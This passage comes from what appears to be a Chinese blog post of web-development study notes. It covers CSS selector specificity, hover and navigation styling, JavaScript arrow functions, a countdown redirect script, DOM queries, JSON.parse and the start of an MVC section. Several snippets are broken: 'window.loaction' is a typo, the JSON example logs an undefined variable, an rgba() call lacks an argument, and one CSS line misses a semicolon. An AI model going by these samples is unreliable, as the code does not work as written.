data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151450148.png\"\n                        alt=\"图片\"\n                 ></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;date&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;mydate&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151450996.png\"\n                       \n                 ></p>\n<h2 id=\"3-css\"><a href=\"#3-css\" class=\"headerlink\" title=\"3.css\"></a>3.css</h2><h4 id=\"◼-CSS的一些单位\"><a href=\"#◼-CSS的一些单位\" class=\"headerlink\" title=\"◼ CSS的一些单位\"></a>◼ CSS的一些单位</h4><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451939.png\"\n                        alt=\"图片-1667485429884\"\n                 ></p>\n<h4 id=\"◼常见选择器及优先级\"><a href=\"#◼常见选择器及优先级\" class=\"headerlink\" title=\"◼常见选择器及优先级\"></a>◼常见选择器及优先级</h4><table>\n<thead>\n<tr>\n<th>选择器</th>\n<th>10000</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>style（内联样式）</td>\n<td>1000</td>\n</tr>\n<tr>\n<td>id选择器</td>\n<td>100</td>\n</tr>\n<tr>\n<td>类选择器、属性选择器、伪类</td>\n<td>10</td>\n</tr>\n<tr>\n<td>标签选择题、伪元素</td>\n<td>1</td>\n</tr>\n<tr>\n<td>通配符</td>\n<td>0</td>\n</tr>\n</tbody></table>\n<p><strong>一般来说：选择范围较大的级别较低</strong></p>\n<h4 id=\"◼CSS-的-2-个示例\"><a href=\"#◼CSS-的-2-个示例\" class=\"headerlink\" title=\"◼CSS 的 2 个示例\"></a>◼CSS 的 2 个示例</h4><h5 id=\"1-悬浮变色、边框、阴影等效果\"><a href=\"#1-悬浮变色、边框、阴影等效果\" class=\"headerlink\" title=\"1.悬浮变色、边框、阴影等效果\"></a>1.悬浮变色、边框、阴影等效果</h5><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>:lightgrey;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>:<span class=\"number\">130px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border-left</span>:<span class=\"number\">20px</span> solid green <span class=\"comment\">/*做边框*/</span></span><br><span class=\"line\">\tborder-radius:<span class=\"number\">5px</span>;<span class=\"comment\">/*圆角*/</span></span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>:<span class=\"number\">10px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>:<span class=\"number\">30px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">div</span><span class=\"selector-pseudo\">:hover</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>:<span class=\"built_in\">rgb</span>(<span class=\"number\">151</span>,<span class=\"number\">248</span>,<span class=\"number\">39</span>);</span><br><span class=\"line\">\t<span class=\"attribute\">cursor</span>:pointer;</span><br><span class=\"line\">\t<span class=\"attribute\">box-shadow</span>:<span class=\"number\">3px</span> <span class=\"number\">3px</span> <span class=\"number\">5px</span> <span class=\"number\">1px</span> <span class=\"built_in\">rgba</span>(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0.2</span>);<span class=\"comment\">/*阴影*/</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;<span class=\"selector-tag\">div</span>&gt;武汉科技大学&lt;/<span class=\"selector-tag\">div</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>background-color</code>属性设置元素的背景颜色</li>\n<li><code>width</code>设置段落宽度</li>\n<li><code>border-left</code>设置左边框属性</li>\n<li><code>border-radius</code>添加圆角边框</li>\n<li><code>padding</code>内边距</li>\n<li><code>margin</code>外边距</li>\n<li><code>hover</code>选择鼠标指针浮动在其上的元素，并设置其样式</li>\n<li><code>cursor:pointer</code>网页浏览时用户鼠标指针的样式或图形形状为一只伸出食指的手</li>\n<li><code>box-shadow</code> 属性用于在元素的框架上添加阴影效果（ X 轴偏移量、Y 轴偏移量、模糊半径、扩散半径和颜色）</li>\n</ul>\n<h5 id=\"2-简单导航\"><a href=\"#2-简单导航\" class=\"headerlink\" title=\"2.简单导航\"></a>2.简单导航</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;nav&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#home&quot;</span>&gt;</span>主页<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#news&quot;</span>&gt;</span>新闻<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#contact&quot;</span>&gt;</span>联系<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#about&quot;</span>&gt;</span>关于<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">ul</span><span class=\"selector-class\">.nav</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">list-style-type</span>: none;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:link</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:visited</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">display</span>: block;</span><br><span class=\"line\">        <span class=\"attribute\">width</span>: <span class=\"number\">120px</span>;</span><br><span class=\"line\">        <span class=\"attribute\">text-align</span>: center;</span><br><span class=\"line\">        <span class=\"attribute\">padding</span>: <span class=\"number\">4px</span>;</span><br><span class=\"line\">        <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">        <span class=\"attribute\">background-color</span>: <span class=\"number\">#98bf21</span>;</span><br><span class=\"line\">        <span class=\"attribute\">text-decoration</span>: none;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:hover</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:active</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#7a991a</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>float:left</code>把图像像左浮动</li>\n<li><code>list-style-type</code>设置列表样式类型</li>\n<li><code>a:link</code>正常，未访问过的链接</li>\n<li><code>a:visited</code>用户已访问过的链接</li>\n<li><code>display:block</code>设置为块级元素</li>\n<li><code>text-align</code>设置文本对齐方式</li>\n<li><code>text-decoration</code>文本修饰</li>\n</ul>\n<h2 id=\"4-JavaScript\"><a href=\"#4-JavaScript\" class=\"headerlink\" title=\"4.JavaScript\"></a>4.JavaScript</h2><h4 id=\"◼-js基本特点\"><a href=\"#◼-js基本特点\" class=\"headerlink\" title=\"◼ js基本特点\"></a>◼ js基本特点</h4><ul>\n<li>JS是一种**<u>解释性脚本语言</u>**（代码不进行预编译，可在程序运行过程中逐行进行解释）</li>\n<li>JS是一种**<u>简单的弱类型脚本语</u>**言（未使用严格的数据类型</li>\n<li>JS是一种**<u>基于对象的语言</u>**（不仅可以创建对象，也能使用自身的对象或其他语言创建的对象）</li>\n<li>JS是一种**<u>跨平台脚本语言</u>**（不依赖于操作系统，仅需要浏览器的支持）</li>\n</ul>\n<h4 id=\"◼JS箭头函数\"><a href=\"#◼JS箭头函数\" class=\"headerlink\" title=\"◼JS箭头函数\"></a>◼JS箭头函数</h4><p><strong>匿名函数可进一步用箭头函数来简化（箭头函数用<code>=&gt;</code>定义，也成：lambda表达式</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> foo=<span class=\"keyword\">function</span>(<span class=\"params\">num</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num+<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> a=<span class=\"title function_\">foo</span>(<span class=\"number\">100</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//使用箭头函数</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"title function_\">foo</span> =(<span class=\"params\">num</span>)=&gt;num+<span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n\n<p> <strong>JS 数组操作：map、reduce、join、slice、splice、push、pop、shift、unshift 方法基本用法</strong></p>\n<p><strong>JS 程序：五秒倒计时，跳转到学校官网</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;ok&quot;</span>&gt;</span>3秒后确定<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> btn=<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;ok&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    btn.<span class=\"property\">disabled</span>=<span class=\"literal\">true</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> t=<span class=\"number\">3</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">function</span> <span class=\"title function_\">count</span>(<span class=\"params\"></span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        t--;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        btn.<span class=\"property\">innerHTML</span>=t+<span class=\"string\">&quot;秒后确定&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">if</span>(t&lt;=<span class=\"number\">0</span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"built_in\">clearInterval</span>(id);</span></span><br><span class=\"line\"><span class=\"language-javascript\">            btn.<span class=\"property\">disabled</span>=<span class=\"literal\">false</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            btn.<span class=\"property\">innerHTML</span>=<span class=\"string\">&quot;确定&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">let</span> url=<span class=\"variable language_\">window</span>.<span class=\"property\">location</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"variable language_\">window</span>.<span class=\"property\">loaction</span>=<span class=\"string\">&quot;https://www.wust.edu.cn&quot;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> id = <span class=\"built_in\">setInterval</span>(count,<span class=\"number\">1000</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>document.getElementById</code>方法可返回对拥有指定 ID 的第一个对象的引用</li>\n<li><code>btn.disabled</code>禁用</li>\n<li><code>btn.innerHTML</code> 属性设置或返回表格行的开始和结束标签之间的 HTML。</li>\n<li><code>setInterval</code>方法可按照指定的周期（以毫秒计）来调用函数或计算表达式</li>\n<li><code>clearInterval</code>方法可取消由 setInterval() 函数设定的定时执行操作</li>\n<li><code>window.loaction</code>页面跳转</li>\n</ul>\n<h4 id=\"◼DOM基本概念\"><a href=\"#◼DOM基本概念\" class=\"headerlink\" title=\"◼DOM基本概念\"></a>◼DOM基本概念</h4><p><strong>DOM:文档对象模型</strong></p>\n<p><strong>DOM是载入到浏览器中的文档模型，以节点树的形式来表现文档，每个节点代表文档的构成部分</strong></p>\n<h4 id=\"◼DOM常用操作\"><a href=\"#◼DOM常用操作\" class=\"headerlink\" title=\"◼DOM常用操作\"></a>◼DOM常用操作</h4><h5 id=\"1-查询操作\"><a href=\"#1-查询操作\" class=\"headerlink\" title=\"1.查询操作\"></a>1.查询操作</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;list&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> list = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;list&#x27;</span>) <span class=\"comment\">// 命中id=&quot;list&quot;的元素，注意不带#，不是css选择器</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(list.<span class=\"property\">innerHTML</span>) <span class=\"comment\">//查看元素的HTML内容</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> first = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&#x27;.item&#x27;</span>) <span class=\"comment\">// 命中第一个 class=&quot;item&quot; 参数为class选择器</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(first.<span class=\"property\">innerHTML</span>)</span><br><span class=\"line\"><span class=\"keyword\">let</span> second = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&#x27;.item:nth-child(2)&#x27;</span>) <span class=\"comment\">// 命中第二个 .item 复杂的css选择器</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(second.<span class=\"property\">innerHTML</span>)</span><br><span class=\"line\"><span class=\"keyword\">let</span> items = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelectorAll</span>(<span class=\"string\">&#x27;.item&#x27;</span>) <span class=\"comment\">// 获得包含所有 .item 的集合（NodeList）</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(items.<span class=\"property\">length</span>) <span class=\"comment\">//查看集合长度</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ( <span class=\"keyword\">let</span> el <span class=\"keyword\">of</span> items ) &#123; <span class=\"comment\">//遍历集合</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(el)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-创建操作：document-createElement\"><a href=\"#2-创建操作：document-createElement\" class=\"headerlink\" title=\"2.创建操作：document.createElement\"></a>2.创建操作：document.createElement</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;list&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> list = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;ul&#x27;</span>) <span class=\"comment\">//创建1个ul元素</span></span><br><span class=\"line\">list.<span class=\"property\">id</span> = <span class=\"string\">&#x27;list&#x27;</span> <span class=\"comment\">// 设置元素的id属性</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ( <span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">3</span>; i++ ) &#123;</span><br><span class=\"line\"><span class=\"keyword\">let</span> item = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;li&#x27;</span>) <span class=\"comment\">//循环创建3个li元素</span></span><br><span class=\"line\">item.<span class=\"property\">className</span> = <span class=\"string\">&#x27;item&#x27;</span> <span class=\"comment\">// 设置元素的class属性</span></span><br><span class=\"line\">item.<span class=\"property\">innerText</span> = <span class=\"string\">`<span class=\"subst\">$&#123;i + <span class=\"number\">1</span>&#125;</span>`</span> <span class=\"comment\">// 设置元素的innerText属性 (使用了模板字符串)</span></span><br><span class=\"line\">list.<span class=\"title function_\">appendChild</span>(item) <span class=\"comment\">// 将创建好的元素添加到父节点</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 将list添加到body</span></span><br><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"property\">body</span>.<span class=\"title function_\">appendChild</span>(list)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"JSON对象定义基本特点\"><a href=\"#JSON对象定义基本特点\" class=\"headerlink\" title=\"JSON对象定义基本特点\"></a>JSON对象定义基本特点</h4><ul>\n<li><strong><u>数据在键值对中（键名即属性名必须加双引号）</u></strong></li>\n<li><strong><u>数据由逗号分隔</u></strong></li>\n<li><strong><u>花括号保存对象</u></strong></li>\n<li><strong><u>方括号保存数组</u></strong></li>\n</ul>\n<p><strong>JSON可通过JavaScript进行解析，JSON的值可以是：数字 字符串 逻辑值 数组 对象 null</strong></p>\n<p><strong>json不能存储Date对象，如果需要则用字符串表示</strong></p>\n<h4 id=\"JSON-parse程序示例：\"><a href=\"#JSON-parse程序示例：\" class=\"headerlink\" title=\"JSON.parse程序示例：\"></a>JSON.parse程序示例：</h4><p><strong>◼ JSON.parse(text [, reviver]) ：将JSON格式字符串转换为JavaScript对象</strong></p>\n<p><strong>◼ 参数说明：</strong></p>\n<ul>\n<li><code>text</code>：必需，一个有效的JSON字符串 (如格式不正确则解析会出错)</li>\n<li><code>reviver</code>：可选，一个转换结果的函数， 将为对象的每个成员调用此函数</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> jstr = <span class=\"string\">&#x27;&#123;&quot;name&quot;:&quot;wust&quot;, &quot;url&quot;:&quot;www.wust.edu.cn&quot;,&quot;birthday&quot;:&quot;1898-11-21&quot;&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> obj = <span class=\"title class_\">JSON</span>.<span class=\"title function_\">parse</span>( jstr, <span class=\"keyword\">function</span>(<span class=\"params\">key, value</span>) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (key == <span class=\"string\">&quot;birthday&quot;</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">let</span> diff = <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>() - <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>(value); <span class=\"comment\">//计算距今的毫秒数</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">let</span> year = <span class=\"built_in\">parseInt</span>(diff / <span class=\"number\">1000</span> / <span class=\"number\">60</span> / <span class=\"number\">60</span> / <span class=\"number\">24</span> / <span class=\"number\">365</span>); <span class=\"comment\">//相差的年数</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> year;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(jsonObj.<span class=\"property\">birthday</span>);</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"二-MVC后台部分\"><a href=\"#二-MVC后台部分\" class=\"headerlink\" title=\"二.MVC后台部分\"></a>二.MVC后台部分</h1><h4 id=\"1-MVC基本概念：\"><a href=\"#1-MVC基本概念：\" class=\"headerlink\" title=\"1.MVC基本概念：\"></a>1.MVC基本概念：</h4><ul>\n<li>MVC:是一种体系结构模式，他将应用程序分成3个主要组件：**<u>模型（Model）视图（View）和控制器（Controller）</u>**</li>\n<li>MVC模式有助于实现关注点分离：</li>\n<li>关注点：<strong>输入逻辑</strong> <strong>业务逻辑</strong> <strong>UI逻辑</strong></li>\n</ul>\n<h4 id=\"2-MVC三个模块功能\"><a href=\"#2-MVC三个模块功能\" class=\"headerlink\" 